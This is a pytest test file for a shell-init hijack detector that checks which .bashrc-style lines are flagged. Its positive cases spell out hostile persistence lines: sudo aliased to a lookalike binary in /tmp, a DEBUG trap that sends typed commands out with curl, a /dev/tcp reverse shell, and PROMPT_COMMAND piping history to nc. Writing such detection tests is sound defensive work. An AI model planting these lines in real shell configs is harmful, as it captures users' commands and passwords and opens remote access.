"""RL-08: alias, trap and PROMPT_COMMAND hijacks in shell init files."""
import pytest

from ubuntils.detectors.rules import _rc_hijack, rule_shell_rc_modification


@pytest.mark.parametrize("line", [
    "alias sudo='/tmp/.s/sudo'",
    'alias sudo="sudo_wrapper"',
    "alias ssh='python3 /home/u/.cache/s.py'",
    "alias su=myshell",
    "trap 'curl -s http://198.51.100.7/k?$(history 1) >/dev/null' DEBUG",
    "trap \"bash -i >& /dev/tcp/192.0.2.1/9 0>&1\" EXIT",
    'export PROMPT_COMMAND="history 1 | nc 192.0.2.1 9"',
    "PROMPT_COMMAND+='; /dev/shm/.x'",
])
def test_hijacks_are_reported(line):
    assert _rc_hijack(line)


@pytest.mark.parametrize("line", [
    "alias ls='ls --color=auto'",
    "alias sudo='sudo '",
    "alias ssh='ssh -A'",
    "alias grep='grep --color=auto'",
    "trap '__bp_preexec_invoke_exec \"$_\"' DEBUG",
    'PROMPT_COMMAND="history -a; $PROMPT_COMMAND"',
    "PROMPT_COMMAND=__vte_prompt_command",
    "trap 'rm -f $tmpfile' EXIT",
])
def test_ordinary_shell_setups_are_not(line):
    assert _rc_hijack(line) is None


def test_hijack_in_an_old_file_is_a_medium_finding():
    entry = {"source": "/home/u/.bashrc", "owner": "u", "mtime": 0.0, "ctime": 0.0,
             "content": "# stock\nalias ll='ls -alF'\nalias sudo='/tmp/.s/sudo'\n"}
    findings = rule_shell_rc_modification({"shell_init_files": [entry]})
    assert len(findings) == 1 and findings[0].severity.value == "MEDIUM"
    assert findings[0].raw_value == "alias sudo='/tmp/.s/sudo'"
    assert "hijacks the shell" in findings[0].signals[0]["detail"]


def test_alias_to_the_real_binary_is_fine_but_a_lookalike_is_not():
    assert _rc_hijack("alias sudo='/usr/bin/sudo -E'") is None
    assert _rc_hijack("alias sudo='/var/tmp/sudo'")
